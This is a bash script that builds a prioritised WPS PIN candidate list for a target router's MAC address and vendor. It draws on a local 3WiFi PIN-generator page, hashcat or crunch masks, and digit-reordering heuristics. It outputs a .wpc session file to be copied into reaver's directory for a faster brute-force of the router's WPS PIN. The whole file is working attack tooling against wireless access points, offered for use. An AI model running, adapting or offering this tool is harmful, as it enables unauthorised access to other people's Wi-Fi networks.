#!/bin/bash

echo " "
echo "Opened new terminal !!!"
echo " "
echo "Write traget MAC and save -> <BSSID> <Vendor> <Vendor>"
echo " "
echo "Choose from the Vendor examples:"
echo " "
cat choose-vendor.txt
echo " "

mkdir result

qterminal -e nano result/MAC-Vendor.txt

sed "s/XX:XX:XX:XX:XX:XX/$(cut -d ' ' -f 1 result/MAC-Vendor.txt)/g" 3W_wps-pin_Firefox/'3WiFi WPS PIN generatorFIREFOX.html' > 3W_wps-pin_Firefox/"$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').html"

echo " "
echo "Opened new terminal and browser !!!"
echo " "
echo "Copy MAC PIN algorithms and save -> CLICK Get All !!!"
echo " "

firefox 3W_wps-pin_Firefox/"$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').html" | qterminal -e nano result/MAC-PIN-alg.txt

mkdir working

echo -e '#!/bin/bash\n' > working/sedcommand-01.sh
cut -d ' ' -f 2- result/MAC-Vendor.txt | sed 's/ /\n/g' | sed -e '/^[[:space:]]*$/d' -e 's/[ ]//g' | sort -u | sed "s/.*/-e 's\/&\/GRABBING\/g'/" | paste -d" " -s | sed "s/.*/sed &/" >> working/sedcommand-01.sh

echo " "
echo "Remaining process logging......"
echo " "
echo "Vendor main PINs ----------------"
# Vendor main PINs ----------------
bash working/sedcommand-01.sh < result/MAC-PIN-alg.txt | sed -e '/^[0-9]\{8\}/!d' -e '/GRABBING/!d' -e '/^[[:space:]]*$/d' | cut -c 1-4 | cat -n | sort -uk2 | sort -nk1 | cut -f2- > working/main-4_01.txt
bash working/sedcommand-01.sh < result/MAC-PIN-alg.txt | sed -e '/^[0-9]\{8\}/!d' -e '/GRABBING/!d' -e '/^[[:space:]]*$/d' | cut -c 5-7 | cat -n | sort -uk2 | sort -nk1 | cut -f2- > working/main-3_01.txt
bash working/sedcommand-01.sh < result/MAC-PIN-alg.txt | sed -e '/^[0-9]\{8\}/!d' -e '/GRABBING/!d' -e '/^[[:space:]]*$/d' | cut -c 1-8 | cat -n | sort -uk2 | sort -nk1 | cut -f2- > working/main-PIN_01.txt

echo "General main PINs ---------------"
# General main PINs ---------------
bash working/sedcommand-01.sh < result/MAC-PIN-alg.txt | sed -e '/^[0-9]\{8\}/!d' -e '/GRABBING/d' -e '/^[[:space:]]*$/d' | cut -c 1-4 | cat -n | sort -uk2 | sort -nk1 | cut -f2- > working/main-4_02.txt
bash working/sedcommand-01.sh < result/MAC-PIN-alg.txt | sed -e '/^[0-9]\{8\}/!d' -e '/GRABBING/d' -e '/^[[:space:]]*$/d' | cut -c 5-7 | cat -n | sort -uk2 | sort -nk1 | cut -f2- > working/main-3_02.txt
bash working/sedcommand-01.sh < result/MAC-PIN-alg.txt | sed -e '/^[0-9]\{8\}/!d' -e '/GRABBING/d' -e '/^[[:space:]]*$/d' | cut -c 1-8 | cat -n | sort -uk2 | sort -nk1 | cut -f2- > working/main-PIN_02.txt
# ( delete duplicates, no sorting order, another method -> perl -ne 'print if ++$k{$_}==1' )


echo "MAC numbers after writting --- Vendor main 4 ---"
# (main 4)
# MAC numbers after writting --- Vendor main 4 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/main-4_01.txt > working/AfterWrite-4_01.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/main-4_01.txt >> working/AfterWrite-4_01.txt
echo "MAC numbers after writting --- General main 4 ---"
# MAC numbers after writting --- General main 4 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/main-4_02.txt >> working/AfterWrite-4_01.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/main-4_02.txt >> working/AfterWrite-4_01.txt

echo "MAC numbers after writting --- Vendor main 3 ---"
# (main 3)	
# MAC numbers after writting --- Vendor main 3 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/main-3_01.txt > working/AfterWrite-3_01.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/main-3_01.txt >> working/AfterWrite-3_01.txt
echo "MAC numbers after writting --- General main 3 ---"
# MAC numbers after writting --- General main 3 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/main-3_02.txt >> working/AfterWrite-3_01.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/main-3_02.txt >> working/AfterWrite-3_01.txt

# (main PIN 8)
echo "MAC numbers after writting --- Vendor main PIN 8 ---"
# MAC numbers after writting --- Vendor main PIN 8 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/main-PIN_01.txt > result/AfterWrite-PIN.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/main-PIN_01.txt >> result/AfterWrite-PIN.txt
echo "MAC numbers after writting --- General main PIN 8 ---"
# MAC numbers after writting --- General main PIN 8 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/main-PIN_02.txt >> result/AfterWrite-PIN.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/main-PIN_02.txt >> result/AfterWrite-PIN.txt


# ========= 4, 3 hc mask create -> hashcat or crunch ==============================
echo " "
read -p "Make numbers by hashcat, or crunch reverse method? (h/c) " RESP
echo " "
if [ "$RESP" = "h" ]; then

echo "Chosen -> hahcat method !!!"
echo " "
echo "(hashcat outfiles) ---"
# (hashcat outfiles)
# 4 mask ---
hashcat -a 3 ?d?d?d?d --stdout > working/4hc-mask.txt
# 3 mask ---
hashcat -a 3 ?d?d?d --stdout > working/3hc-mask.txt

else

echo "Chosen -> crunch method (default) !!!"
echo " "
echo "(crunch outfiles) ---"
# (crunch outfiles)
# 4 mask ---
crunch 4 4 9876543210 > working/4hc-mask.txt
# 3 mask ---
crunch 3 3 9876543210 > working/3hc-mask.txt

fi

# ========= Subtract identical digits? [0000-9999 000-999] ==========
echo " "
read -p "Subtract identical digits? [0000-9999] [000-999] (y/n) " RESP
echo " "
if [ "$RESP" = "y" ]; then

echo "Chosen -> identical digits do not come to the fore !!!"
echo " "
echo "(yes) ---"
# Identical digits do not come to the fore ---
sed -i '/9999/d;/8888/d;/7777/d;/6666/d;/5555/d;/4444/d;/3333/d;/2222/d;/1111/d;/0000/d' working/4hc-mask.txt
sed -i '/999/d;/888/d;/777/d;/666/d;/555/d;/444/d;/333/d;/222/d;/111/d;/000/d' working/3hc-mask.txt
# Afterwre subtract digits ---
echo -e "9999\n8888\n7777\n6666\n5555\n4444\n3333\n2222\n1111\n0000" >> working/4hc-mask.txt
echo -e "999\n888\n777\n666\n555\n444\n333\n222\n111\n000" >> working/3hc-mask.txt

else

echo "Chosen -> identical digits left in place (default) !!!"
echo " "
echo "(no) ---"

fi
echo " "
# ================================================================================

# echo "(hashcat outfiles) ---"
# (hashcat outfiles)
# 4 mask ---
# hashcat -a 3 ?d?d?d?d --stdout > working/4hc-mask.txt
# 3 mask ---
# hashcat -a 3 ?d?d?d --stdout > working/3hc-mask.txt

# echo "hashcat instead: with cunch..."------
# ========== hashcat instead: with cunch... subtract the same digits and afterwrite ==========
# crunch 4 4 9876543210 -d 3% > working/4hc-mask.txt
# crunch 3 3 9876543210 -d 2% > working/3hc-mask.txt
# echo -e "9999\n8888\n7777\n6666\n5555\n4444\n3333\n2222\n1111\n0000" >> working/4hc-mask.txt
# echo -e "999\n888\n777\n666\n555\n444\n333\n222\n111\n000" >> working/3hc-mask.txt
# ============================================================================================
# echo "with hashcat plus mode..."------
# =========== with hashcat plus mode... subtract the same digits and afterwrite ==============
# sed -i '/9999/d;/8888/d;/7777/d;/6666/d;/5555/d;/4444/d;/3333/d;/2222/d;/1111/d;/0000/d' working/4hc-mask.txt
# sed -i '/999/d;/888/d;/777/d;/666/d;/555/d;/444/d;/333/d;/222/d;/111/d;/000/d' working/3hc-mask.txt
# echo -e "9999\n8888\n7777\n6666\n5555\n4444\n3333\n2222\n1111\n0000" >> working/4hc-mask.txt
# echo -e "999\n888\n777\n666\n555\n444\n333\n222\n111\n000" >> working/3hc-mask.txt
# ============================================================================================

echo "MAC numbers after writting --- hc mask 4 ---"
# MAC numbers after writting --- hc mask 4 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/4hc-mask.txt > working/AfterWrite-4_02.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/4hc-mask.txt >> working/AfterWrite-4_02.txt
echo "MAC numbers after writting --- hc mask 3 ---"
# MAC numbers after writting --- hc mask 3 ---
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/!d" working/3hc-mask.txt > working/AfterWrite-3_02.txt
sed "/[$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed -e 's/://g' -e 's/[A-F]//g' -f <(printf 's/[%s]//2g\n' {0..9}))]/d" working/3hc-mask.txt >> working/AfterWrite-3_02.txt


# ========= Again Subtract identical digits? [0000-9999 000-999] =================
echo " "
read -p "Again Subtract identical digits, despite of MAC numbers? (y/n) " RESP
echo " "
if [ "$RESP" = "y" ]; then

echo "Chosen -> again identical digits do not come to the fore !!!"
echo " "
echo "(yes) ---"
# Identical digits do not come to the fore ---
sed -i '/9999/d;/8888/d;/7777/d;/6666/d;/5555/d;/4444/d;/3333/d;/2222/d;/1111/d;/0000/d' working/AfterWrite-4_02.txt
sed -i '/999/d;/888/d;/777/d;/666/d;/555/d;/444/d;/333/d;/222/d;/111/d;/000/d' working/AfterWrite-3_02.txt
# Afterwre subtract digits ---
echo -e "9999\n8888\n7777\n6666\n5555\n4444\n3333\n2222\n1111\n0000" >> working/AfterWrite-4_02.txt
echo -e "999\n888\n777\n666\n555\n444\n333\n222\n111\n000" >> working/AfterWrite-3_02.txt

else

echo "Chosen -> again identical digits left in place (default) !!!"
echo " "
echo "(no) ---"

fi
echo " "
# ================================================================================


echo "(sedcommand files) ---"
# (sedcommand files)
# 4 (02)
echo -e '#!/bin/bash\n' > working/sedcommand-02.sh
sed "s/.*/-e '\/&\/d'/" working/AfterWrite-4_01.txt | paste -d" " -s | sed "s/.*/sed &/" >> working/sedcommand-02.sh
# 3 (03)
echo -e '#!/bin/bash\n' > working/sedcommand-03.sh
sed "s/.*/-e '\/&\/d'/" working/AfterWrite-3_01.txt | paste -d" " -s | sed "s/.*/sed &/" >> working/sedcommand-03.sh

echo "(bash 4) ---"
# (bash 4)
bash working/sedcommand-02.sh < working/AfterWrite-4_02.txt | sed -e '/^[[:space:]]*$/d' -e 's/[ ]//g' > working/AfterWrite-4_02cut.txt
echo "(bash 3) ---"
# (bash 3)
bash working/sedcommand-03.sh < working/AfterWrite-3_02.txt | sed -e '/^[[:space:]]*$/d' -e 's/[ ]//g' > working/AfterWrite-3_02cut.txt

echo "backup 4 (01) ---"
# backup 4 (01)
cp working/AfterWrite-4_01.txt working/AfterWrite-4_01cp.txt
echo "backup 3 (01) ---"
# backup 3 (01)
cp working/AfterWrite-3_01.txt working/AfterWrite-3_01cp.txt

echo "continues under the lines 4 ---"
# continues under the lines 4
cat working/AfterWrite-4_02cut.txt >> working/AfterWrite-4_01cp.txt
echo "continues under the lines 3 ---"
# continues under the lines 3
cat working/AfterWrite-3_02cut.txt >> working/AfterWrite-3_01cp.txt

#--------------------------------------------------------

echo -e "0\n0\n0" > result/"$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').wpc"

cat working/AfterWrite-4_01cp.txt >> result/"$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').wpc"

cat working/AfterWrite-3_01cp.txt >> result/"$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').wpc"

# Unecessary file remove
rm 3W_wps-pin_Firefox/"$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').html"

# folders, file rename...
mv result/AfterWrite-PIN.txt result/"Main-PIN-$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g').txt"

mv working "working-$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g')"
mv result "result-$(cut -d ' ' -f 1 result/MAC-Vendor.txt | sed 's/://g')"

#-------------------------------------------------------
echo " "
echo "PROCESS END SUCCESS !!! :-)"
echo " "
echo "Final file to use -> result/... $(cut -d ' ' -f 1 result-*/MAC-Vendor.txt | sed 's/://g').wpc"
echo " "
echo "(copy to use -> cp *.wpc /var/lib/reaver/)"
echo " "
